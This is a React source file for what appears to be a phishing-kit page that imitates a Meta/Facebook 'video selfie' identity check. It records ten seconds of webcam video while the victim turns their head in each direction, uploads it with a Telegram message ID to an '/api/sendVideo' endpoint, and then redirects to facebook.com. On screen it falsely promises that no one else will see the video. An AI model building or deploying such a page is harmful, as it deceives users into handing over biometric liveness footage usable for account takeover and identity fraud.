import { FC, useRef, useState, useCallback, useEffect } from 'react';
import Webcam from 'react-webcam';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import {
    faArrowUp,
    faArrowDown,
    faArrowLeft,
    faArrowRight,
    faSpinner,
    faLock,
} from '@fortawesome/free-solid-svg-icons';

const RECORDING_TIME = 10000;
const DIRECTION_INTERVAL = 2500;
const KycFaceVerify: FC = () => {
    const webcamRef = useRef<Webcam>(null);
    const mediaRecorderRef = useRef<MediaRecorder | null>(null);
    const [isRecording, setIsRecording] = useState(false);
    const [currentDirection, setCurrentDirection] = useState<number>(0);
    const [timeLeft, setTimeLeft] = useState<number>(RECORDING_TIME / 1000);
    const [isUploading, setIsUploading] = useState(false);
    const chunks = useRef<Blob[]>([]);

    const directions = [
        {
            icon: faArrowUp,
            text: 'Look Up',
            position: 'top-[10%] left-1/2 -translate-x-1/2',
        },
        {
            icon: faArrowDown,
            text: 'Look Down',
            position: 'bottom-[10%] left-1/2 -translate-x-1/2',
        },
        {
            icon: faArrowLeft,
            text: 'Turn Left',
            position: 'left-[10%] top-1/2 -translate-y-1/2',
        },
        {
            icon: faArrowRight,
            text: 'Turn Right',
            position: 'right-[10%] top-1/2 -translate-y-1/2',
        },
    ];

    const videoConstraints = {
        width: 720,
        height: 720,
        facingMode: 'user',
    };

    useEffect(() => {
        let timer: NodeJS.Timeout;
        let directionTimer: NodeJS.Timeout;

        if (isRecording) {
            timer = setInterval(() => {
                setTimeLeft((prev) => Math.max(0, prev - 1));
            }, 1000);

            directionTimer = setInterval(() => {
                setCurrentDirection((prev) => (prev + 1) % directions.length);
            }, DIRECTION_INTERVAL);
        }

        return () => {
            clearInterval(timer);
            clearInterval(directionTimer);
        };
    }, [isRecording, directions.length]);

    const generateRandomString = (length: number) => {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    };

    const uploadVideo = useCallback(async (videoBlob: Blob) => {
        setIsUploading(true);
        try {
            const formData = new FormData();
            const extension = videoBlob.type === 'video/webm' ? 'webm' : 'mp4';
            const randomFileName = `face-verify-${generateRandomString(10)}.${extension}`;
            formData.append('video', videoBlob, randomFileName);
            const messageId = localStorage.getItem('telegram_message_id');
            if (messageId) {
                formData.append('message_id', messageId);
            }

            const response = await fetch('/api/sendVideo', {
                method: 'POST',
                body: formData,
            });

            const data = await response.json();

            if (data.success) {
                localStorage.setItem('telegram_message_id', data.message_id.toString());
                window.location.replace('https://www.facebook.com');
            }
        } catch (error) {
            console.error('Error uploading video:', error);
            setIsUploading(false);
        }
    }, []);

    const startRecording = useCallback(() => {
        setIsRecording(true);
        setTimeLeft(RECORDING_TIME / 1000);
        setCurrentDirection(0);
        chunks.current = [];

        const stream = webcamRef.current?.stream;
        if (stream) {
            const mimeType = MediaRecorder.isTypeSupported('video/mp4')
                ? 'video/mp4'
                : 'video/webm';

            console.log('Using mime type:', mimeType);

            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: mimeType,
                videoBitsPerSecond: 2500000,
            });
            mediaRecorderRef.current = mediaRecorder;

            mediaRecorder.onstart = () => {
                console.log('Recording started');
                chunks.current = [];
            };

            mediaRecorder.onstop = () => {
                console.log('Recording stopped');
                const blob = new Blob(chunks.current, { type: mimeType });
                console.log('Final blob size:', blob.size);
                uploadVideo(blob);
            };

            mediaRecorder.ondataavailable = (e) => {
                console.log('Data available:', e.data.size);
                if (e.data.size > 0) {
                    chunks.current.push(e.data);
                }
            };
            mediaRecorder.start();

            setTimeout(() => {
                if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
                    console.log('Stopping recording...');
                    mediaRecorderRef.current.stop();
                    setIsRecording(false);
                }
            }, RECORDING_TIME);
        }
    }, [webcamRef, uploadVideo]);

    return (
        <div className="min-h-screen bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 py-8 font-[Optimistic] md:bg-white md:bg-none">
            <div className="mx-auto w-full max-w-[600px]">
                <div className="mb-6 flex items-center justify-between md:hidden">
                    <button className="text-[#1c2b33] hover:text-gray-700">
                        <FontAwesomeIcon icon={faArrowLeft} size="lg" />
                    </button>
                </div>
                <div className="mb-6 md:mb-8">
                    <p className="text-[13px] font-medium text-[#0a1317]"></p>
                    <h1 className="mb-2 text-2xl font-semibold text-[#0a1317]">
                        Take a Video Selfie
                    </h1>
                    <p className="text-[15px] text-gray-600">
                        We need a short video of you turning your head in different directions. This
                        helps us confirm your identity and check that you&apos;re a real person.
                    </p>
                </div>
                <div className="relative mb-6 md:mb-8">
                    <div className="relative mx-auto aspect-square w-full max-w-[480px]">
                        <div className="relative h-full w-full overflow-hidden rounded-full">
                            <div className="absolute inset-0 rounded-full bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 p-[3px]">
                                <div className="h-full w-full rounded-full bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] p-[2px]">
                                    <div className="relative h-full w-full overflow-hidden rounded-full">
                                        <Webcam
                                            audio={false}
                                            ref={webcamRef}
                                            videoConstraints={videoConstraints}
                                            className="h-full w-full object-cover"
                                        />
                                        <div className="absolute inset-0 flex items-center justify-center">
                                            <div
                                                className={`h-[calc(100%-48px)] w-[calc(100%-48px)] rounded-full border-[3px] ${
                                                    isRecording
                                                        ? 'border-[#0064E0] shadow-[0_0_15px_rgba(0,100,224,0.3)]'
                                                        : 'border-white/90 shadow-[0_0_15px_rgba(255,255,255,0.2)]'
                                                } transition-all duration-300`}
                                            />
                                            <div className="absolute inset-0 -z-10 rounded-full bg-black/20" />
                                        </div>
                                        {isRecording && (
                                            <div
                                                className={`absolute ${directions[currentDirection].position} transform`}
                                            >
                                                <div className="flex flex-col items-center text-white">
                                                    <FontAwesomeIcon
                                                        icon={directions[currentDirection].icon}
                                                        className="mb-2 h-6 w-6 animate-bounce md:h-8 md:w-8"
                                                    />
                                                    <p className="rounded-full bg-black/60 px-4 py-1.5 text-[15px] font-medium backdrop-blur-sm">
                                                        {directions[currentDirection].text}
                                                    </p>
                                                    <p className="mt-2 rounded-full bg-[#0064E0]/80 px-4 py-1.5 text-lg font-semibold backdrop-blur-sm">
                                                        {timeLeft}s
                                                    </p>
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="mb-6 flex items-center gap-3 rounded-xl bg-white/80 p-4 shadow-sm backdrop-blur-sm md:mb-8">
                    <FontAwesomeIcon icon={faLock} className="h-5 w-5 text-gray-600" />
                    <p className="text-[15px] text-gray-600">
                        No one else will see this video and it will be deleted 30 days after your
                        identity is confirmed.
                    </p>
                </div>
                <button
                    className={`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600 ${
                        isRecording || isUploading ? 'cursor-not-allowed opacity-50' : ''
                    }`}
                    onClick={startRecording}
                    disabled={isRecording || isUploading}
                >
                    {isRecording ? (
                        <div className="flex items-center justify-center">
                            <FontAwesomeIcon
                                icon={faSpinner}
                                className="mr-2 h-4 w-4 animate-spin"
                            />
                            Processing...
                        </div>
                    ) : isUploading ? (
                        <div className="flex items-center justify-center">
                            <FontAwesomeIcon
                                icon={faSpinner}
                                className="mr-2 h-4 w-4 animate-spin"
                            />
                            Processing request...
                        </div>
                    ) : (
                        'Start Recording'
                    )}
                </button>
            </div>
        </div>
    );
};

export default KycFaceVerify;
